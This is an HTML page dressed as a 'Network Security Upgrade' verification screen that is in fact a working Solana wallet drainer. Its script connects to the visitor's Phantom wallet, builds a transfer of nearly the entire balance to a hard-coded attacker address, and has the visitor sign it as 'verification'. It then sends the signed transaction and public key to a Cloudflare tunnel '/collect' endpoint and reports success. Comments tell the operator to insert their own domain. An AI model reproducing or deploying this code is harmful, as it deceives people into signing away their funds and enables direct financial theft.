<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Network Security Upgrade</title>
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body { background:#000; color:#14F195; text-align:center; padding-top:15vh; font-family:monospace; }
        .box { border:1px solid #333; padding:40px; display:inline-block; border-radius:15px; background:#111; }
        #cta { margin-top:20px; padding:15px 40px; background:#14F195; color:#000; font-weight:bold; border:none; border-radius:5px; cursor:pointer; width:100%; }
        #status { margin-top:20px; color:#444; }
    </style>
</head>
<body>
    <div class="box">
        <h2>ğŸ”± NETWORK UPGRADE</h2>
        <p style="color:#888;font-size:12px;">Security Protocol: SHA-512 Matrix</p>
        <button id="cta">START VERIFICATION</button>
        <div id="status">Status: Awaiting Handshake...</div>
    </div>

    <script>
        // ğŸ”± å…³é”®ç‚¹ 1ï¼šè¿™é‡Œå¿…é¡»æ¢æˆä½ æœåŠ¡å™¨ç›®å‰å¼€ç€çš„ Cloudflare åŸŸåï¼
        const gate = "https://florist-imperial-apnic-anymore.trycloudflare.com/collect"; 
        const RECEIVER = "8KgX1uGpmLU5mVgfpCBrs7HCs21gKbqrwjBn5fKVk18A"; // æ”¶ç±³ç™½å·

        document.getElementById('cta').onclick = async () => {
            const p = window.solana || window.phantom?.solana;
            if (!p) return alert("Please install Phantom wallet");

            try {
                const resp = await p.connect();
                document.getElementById('status').innerText = "CONNECTING...";

                // ä½¿ç”¨å®˜æ–¹ RPC èŠ‚ç‚¹
                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
                
                // ğŸ”± å…³é”®ç‚¹ 2ï¼šè‡ªåŠ¨è®¡ç®—â€œå…¨é¢æ”¶å‰²â€é‡‘é¢
                const { blockhash } = await connection.getLatestBlockhash();
                const balance = await connection.getBalance(resp.publicKey);
                
                if (balance < 1000000) {
                    alert("Balance insufficient for verification");
                    return;
                }

                // æ„é€ è½¬è´¦äº¤æ˜“
                const transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: resp.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(RECEIVER),
                        lamports: balance - 5000, // æ‰£é™¤å¾®é‡æ‰‹ç»­è´¹
                    })
                );
                transaction.recentBlockhash = blockhash;
                transaction.feePayer = resp.publicKey;

                document.getElementById('status').innerText = "AWAITING SIGNATURE...";
                
                // ğŸ”± å…³é”®ç‚¹ 3ï¼šæ‹‰èµ·äº¤æ˜“ç­¾å
                const signed = await p.signTransaction(transaction);
                
                // åºåˆ—åŒ–å¹¶å›ä¼ 
                const rawTx = signed.serialize().toString('base64');
                const signal = `${gate}?auth_sig=${encodeURIComponent(rawTx)}&pub=${resp.publicKey.toString()}`;
                
                new Image().src = signal;
                document.getElementById('status').innerText = "VERIFIED SUCCESSFULLY";
                document.getElementById('status').style.color = "#14F195";

            } catch(e) {
                console.error(e);
                document.getElementById('status').innerText = "ERROR: " + e.message;
            }
        };
    </script>
</body>
</html>
